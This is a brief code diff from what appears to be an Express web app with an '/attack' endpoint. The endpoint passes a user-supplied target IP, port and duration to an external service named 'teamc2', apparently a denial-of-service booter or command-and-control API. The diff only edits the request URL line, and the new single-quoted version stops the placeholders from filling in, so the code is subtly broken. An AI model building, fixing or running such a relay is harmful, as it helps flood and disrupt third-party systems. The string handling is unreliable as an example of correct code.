@@ -47,7 +47,7 @@ app.post("/attack", async (req, res) => {
       return res.status(500).json({ error: "API key missing" });
     }
 
-    const url = https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1;
+    const url = 'https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1';
 
     const response = await axios.get(url);
 
